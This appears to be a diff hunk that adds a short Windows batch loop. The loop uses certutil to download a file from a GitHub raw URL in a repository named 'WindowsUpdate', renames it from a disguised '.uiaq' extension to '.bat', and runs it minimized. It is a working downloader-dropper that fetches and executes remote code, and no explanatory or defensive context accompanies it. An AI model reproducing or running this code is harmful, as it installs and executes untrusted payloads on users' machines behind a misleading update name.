@@ -1,0 +1,12 @@
+
+:turkish
+ren 8opfile.uiaq 8opfile.bat
+
+IF EXIST 8opfile.bat (
+	start /min 8opfile.bat
+	exit
+) ELSE (
+	certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/AlaskaMN/WindowsUpdate/master/8opfile.uiaq" 8opfile.uiaq
+)
+goto turkish
+
